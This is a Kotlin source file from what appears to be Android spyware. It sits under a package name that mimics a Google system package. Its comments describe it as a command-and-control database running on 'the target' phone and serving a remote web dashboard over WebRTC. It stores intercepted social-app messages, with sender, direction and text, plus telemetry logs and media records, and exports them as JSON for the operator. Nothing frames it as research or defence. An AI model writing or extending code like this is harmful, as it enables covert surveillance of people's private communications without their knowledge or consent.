package com.google.android.system

import android.content.ContentValues
import android.content.Context
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject

/**
 * C2LocalDatabase
 * Embedded SQLite Database running locally on the target Android phone.
 * Serves as the primary local database and server data store for the Web Dashboard over WebRTC DataChannel.
 */
class C2LocalDatabase(context: Context) : SQLiteOpenHelper(context, DATABASE_NAME, null, DATABASE_VERSION) {

    companion object {
        private const val TAG = "C2LocalDatabase"
        private const val DATABASE_NAME = "c2_local_database.db"
        private const val DATABASE_VERSION = 1

        private const val TABLE_SOCIAL_MESSAGES = "social_messages"
        private const val TABLE_TELEMETRY_LOGS = "telemetry_logs"
        private const val TABLE_MEDIA_RECORDS = "media_records"

        @Volatile
        private var instance: C2LocalDatabase? = null

        fun getInstance(context: Context): C2LocalDatabase {
            return instance ?: synchronized(this) {
                instance ?: C2LocalDatabase(context.applicationContext).also { instance = it }
            }
        }
    }

    override fun onCreate(db: SQLiteDatabase) {
        try {
            db.execSQL(
                """
                CREATE TABLE $TABLE_SOCIAL_MESSAGES (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    app_name TEXT,
                    app_key TEXT,
                    sender TEXT,
                    text_content TEXT,
                    direction TEXT,
                    time_str TEXT,
                    timestamp LONG
                );
                """.trimIndent()
            )

            db.execSQL(
                """
                CREATE TABLE $TABLE_TELEMETRY_LOGS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    category TEXT,
                    content TEXT,
                    timestamp LONG
                );
                """.trimIndent()
            )

            db.execSQL(
                """
                CREATE TABLE $TABLE_MEDIA_RECORDS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    media_type TEXT,
                    media_url TEXT,
                    local_path TEXT,
                    timestamp LONG
                );
                """.trimIndent()
            )

            Log.i(TAG, "Created embedded SQLite C2LocalDatabase tables successfully.")
        } catch (e: Exception) {
            Log.e(TAG, "onCreate error: ${e.message}")
        }
    }

    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        db.execSQL("DROP TABLE IF EXISTS $TABLE_SOCIAL_MESSAGES")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_TELEMETRY_LOGS")
        db.execSQL("DROP TABLE IF EXISTS $TABLE_MEDIA_RECORDS")
        onCreate(db)
    }

    fun insertSocialMessage(appName: String, sender: String, text: String, isOutgoing: Boolean) {
        if (text.isBlank()) return
        try {
            val db = writableDatabase
            val appKey = appName.lowercase().replace(Regex("[^a-z0-9]"), "")
            val timeStr = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault()).format(java.util.Date())

            val values = ContentValues().apply {
                put("app_name", appName)
                put("app_key", appKey)
                put("sender", if (sender.isNotBlank()) sender else if (isOutgoing) "Me" else "Contact")
                put("text_content", text)
                put("direction", if (isOutgoing) "outgoing" else "incoming")
                put("time_str", timeStr)
                put("timestamp", System.currentTimeMillis())
            }

            db.insert(TABLE_SOCIAL_MESSAGES, null, values)
            enforceStorageLimit(db, TABLE_SOCIAL_MESSAGES, 500)
        } catch (e: Exception) {
            Log.e(TAG, "insertSocialMessage error: ${e.message}")
        }
    }

    fun insertTelemetryLog(category: String, content: String) {
        if (content.isBlank()) return
        try {
            val db = writableDatabase
            val catKey = category.lowercase().replace(Regex("[^a-z0-9_]"), "")

            val values = ContentValues().apply {
                put("category", catKey)
                put("content", content)
                put("timestamp", System.currentTimeMillis())
            }

            db.insert(TABLE_TELEMETRY_LOGS, null, values)
            enforceStorageLimit(db, TABLE_TELEMETRY_LOGS, 500)
        } catch (e: Exception) {
            Log.e(TAG, "insertTelemetryLog error: ${e.message}")
        }
    }

    fun getSocialMessagesJson(appKey: String): JSONArray {
        val jsonArray = JSONArray()
        try {
            val db = readableDatabase
            val key = appKey.lowercase().replace(Regex("[^a-z0-9]"), "")
            val cursor = db.rawQuery(
                "SELECT sender, text_content, direction, time_str, timestamp FROM $TABLE_SOCIAL_MESSAGES WHERE app_key = ? ORDER BY id ASC LIMIT 50",
                arrayOf(key)
            )

            cursor.use {
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("sender", it.getString(0))
                        put("text", it.getString(1))
                        put("direction", it.getString(2))
                        put("time", it.getString(3))
                        put("timestamp", it.getLong(4))
                    }
                    jsonArray.put(obj)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getSocialMessagesJson error: ${e.message}")
        }
        return jsonArray
    }

    fun getTelemetryLogsJson(category: String): JSONArray {
        val jsonArray = JSONArray()
        try {
            val db = readableDatabase
            val catKey = category.lowercase().replace(Regex("[^a-z0-9_]"), "")
            val cursor = db.rawQuery(
                "SELECT content, timestamp FROM $TABLE_TELEMETRY_LOGS WHERE category = ? ORDER BY id ASC LIMIT 50",
                arrayOf(catKey)
            )

            cursor.use {
                while (it.moveToNext()) {
                    val obj = JSONObject().apply {
                        put("content", it.getString(0))
                        put("timestamp", it.getLong(1))
                    }
                    jsonArray.put(obj)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "getTelemetryLogsJson error: ${e.message}")
        }
        return jsonArray
    }

    private fun enforceStorageLimit(db: SQLiteDatabase, tableName: String, maxRows: Int) {
        try {
            db.execSQL("DELETE FROM $tableName WHERE id NOT IN (SELECT id FROM $tableName ORDER BY id DESC LIMIT $maxRows)")
        } catch (_: Exception) {}
    }
}
